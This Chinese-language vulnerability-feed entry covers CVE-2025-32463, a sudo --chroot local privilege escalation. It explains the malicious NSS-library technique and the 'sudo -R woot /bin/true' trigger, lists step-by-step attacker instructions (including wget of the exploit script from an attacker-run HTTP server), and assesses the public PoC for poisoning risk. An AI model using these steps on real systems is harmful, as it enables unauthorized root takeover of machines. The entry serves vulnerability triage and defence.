## CVE-2025-32463 - Sudo 本地提权 (Local Privilege Escalation)

**漏洞编号:** CVE-2025-32463

**漏洞类型:** 本地提权 (Local Privilege Escalation)

**影响应用:** Sudo

**危害等级:** 高危/Critical

**CVSS评分:** 9.3

**影响版本:** Sudo versions 1.8.8 through 1.9.17 (excluding 1.9.17p1 and later versions)

**利用条件:** 需要本地访问权限和低权限用户身份

**POC 可用性:** 10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-32463是Linux sudo组件中的一个高危本地提权漏洞，CVSS评分为9.3（Critical）。该漏洞影响Sudo版本1.8.8至1.9.17（不包括1.9.17p1及更高版本），允许本地低权限用户绕过权限检查，获取root权限。漏洞根源在于Sudo在处理`--chroot (-R)`选项时，先评估`chroot`路径，后检查用户权限。具体来说，当用户以`sudo -R`或`sudo --chroot`选项执行命令时，Sudo会在进行权限检查之前，先解析`chroot`路径并加载该路径下的动态链接库。攻击者可以利用这一机制，构造一个恶意的`chroot`环境，在该环境中放置一个恶意的`nsswitch.conf`文件以及一个精心制作的共享库（例如，伪装成NSS服务模块）。当Sudo尝试在攻击者控制的`chroot`环境中解析用户或组信息时，会加载并执行攻击者提供的恶意共享库，从而在`sudo`进程的上下文中执行任意代码，最终实现权限提升至root。此漏洞的关键在于Sudo的路径解析和库加载顺序与权限检查逻辑之间的不匹配。

提供的POC代码包含一个`README.md`和一个`cwoot.sh` Bash脚本，旨在完整复现CVE-2025-32463漏洞并直接获取root权限。`cwoot.sh`脚本展现出高度的有效性和可靠性。它自动化了整个攻击链，首先在一个临时目录中创建了一个用于`chroot`环境的结构，包括`woot/etc`和`libnss_`。脚本内嵌了一个C语言源文件`woot1337.c`，该文件包含一个`__attribute__((constructor))`函数，其作用是在库加载时自动执行`setreuid(0, 0)`、`setregid(0, 0)`以及`execl("/bin/bash", "/bin/bash", NULL)`，即在进程启动时立即将用户和组ID设置为root（0），然后执行`/bin/bash`以提供一个root shell。脚本使用`gcc`将`woot1337.c`编译为名为`libnss_/woot1337.so.2`的共享库。随后，它在`woot/etc`目录下创建了一个恶意的`nsswitch.conf`文件，将其`passwd`服务项指向`/woot1337`，从而强制Sudo在`chroot`环境中加载这个恶意的NSS模块。最后，通过执行`sudo -R woot /bin/true`命令，Sudo在攻击者控制的`woot`目录下尝试解析`/bin/true`命令，并在此过程中加载攻击者提供的恶意NSS模块，最终触发共享库中的`constructor`函数，成功获取root shell。整个流程清晰、自动化，且不依赖复杂的用户交互，显示该POC是一个可靠的完整利用代码。

攻击者利用此POC的步骤如下：
1.  **获取POC代码：** 攻击者首先通过`git clone https://github.com/justjoeyking/CVE-2025-32463.git`获取漏洞复现脚本。
2.  **在攻击者机器上启动HTTP服务：** 攻击者在其控制的机器上启动一个简单的HTTP服务器，例如`python3 -m http.server 8080`，以便目标机器可以下载`cwoot.sh`脚本。
3.  **在目标机器上下载脚本：** 在受影响的Linux目标机器上，低权限用户通过`wget http://<own_IP_address>:8080/cwoot.sh`下载`cwoot.sh`脚本。
4.  **赋予执行权限：** 为下载的脚本添加执行权限：`chmod 755 cwoot.sh`。
5.  **执行脚本：** 在目标机器上执行脚本：`./cwoot.sh`。执行后，脚本会自动在临时目录中设置恶意`chroot`环境和NSS模块，并通过`sudo -R woot /bin/true`触发漏洞，最终在当前终端获得一个root权限的shell。

对提供的POC代码`cwoot.sh`及其内嵌的`woot1337.c`进行分析，评估其投毒风险。该POC的主要目的是演示和利用CVE-2025-32463漏洞以实现本地权限提升。`woot1337.c`中的代码仅用于将进程的有效用户ID和组ID设置为root（0），并启动一个新的`/bin/bash` shell，这是典型的权限提升漏洞利用负载。脚本的其他部分，如创建临时目录、编译C代码、设置`chroot`环境以及调用`sudo`命令，均是实现漏洞利用的必要步骤，且使用的都是标准的Linux系统工具和命令。在整个POC代码中，没有发现明显的恶意行为，例如代码混淆、向外部IP地址或域名发起连接以窃取数据或建立命令与控制（C2）通道、安装额外后门、可疑的`eval`或其他动态执行方式、或依赖其他不受控的外部恶意脚本。鉴于该POC代码的透明性、单一目的性以及未使用隐蔽或附加恶意功能，其被误判为恶意投毒的风险极低。该POC准确地复现了CVE-2025-32463漏洞，其核心目的就是权限提升，不包含超出此范围的额外恶意载荷。因此，该POC的投毒风险评估为低（10%）。

**项目地址:** https://github.com/justjoeyking/CVE-2025-32463.git

**漏洞详情:** https://ubuntu.com/security/CVE-2025-32463
